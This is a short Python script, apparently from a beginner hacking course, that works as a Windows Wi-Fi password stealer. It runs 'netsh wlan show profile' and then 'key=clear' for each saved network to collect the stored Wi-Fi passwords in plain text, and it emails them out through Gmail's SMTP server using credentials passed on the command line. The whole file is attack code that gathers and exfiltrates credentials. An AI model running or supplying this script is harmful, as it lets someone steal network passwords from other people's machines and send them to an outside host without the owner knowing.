#!/usr/bin/env python

import subprocess, smtplib, re, optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e", "--email", dest="email", help="Select mail to send data")
    parser.add_option("-p", "--password", dest="password", help="Past your app password")
    (options, arguments) = parser.parse_args()

    if not options.email:
        parser.error("[-] Please select your e-mail address use --help for mor info.")
    elif not options.password:
        parser.error("[-] Please write your e-mail app password use --help for mor info.")

    return options

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

options = get_arguments()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_name_list = re.findall("(?:Profile\s*:\s)(.*)", str(networks))

result = ""
for network_name in networks_name_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail(options.email, options.password, result)

